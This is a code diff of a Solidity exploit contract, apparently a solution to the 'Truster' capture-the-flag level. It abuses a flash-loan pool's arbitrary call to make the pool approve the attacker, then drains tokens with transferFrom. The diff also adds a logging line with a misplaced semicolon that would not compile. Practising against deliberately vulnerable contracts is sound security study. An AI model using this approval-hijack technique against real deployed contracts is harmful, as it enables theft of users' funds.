@@ -32,19 +32,18 @@ contract TrusterAttack {
         token = IERC20(tokenAddress);
         attacker = attackerAddress;
         balance = token.balanceOf(pool);
-
         uint256 transferAmount = 0;
-
         IPoolFunc(pool).flashLoan(
             transferAmount,
             address(this),
             tokenAddress,
             abi.encodeWithSignature(
                 "approve(address, uint256)",
-                address(this),
-                balance
+                attacker,
+                1
             )
         );
+        console.log("Flashloan complete %s", token.balanceOf(attacker););
         //token.transfer(pool, transferAmount);
         //IERC20(tokenAddress).transfer(attackerAddress, balance);
         //calldata = approve(pool, this)
@@ -53,7 +52,7 @@ contract TrusterAttack {
         //
     }
     function transferMe() public{
-        token.transferFrom(pool, attacker, balance);
+        token.transferFrom(pool, attacker, 1);
     }
 
    
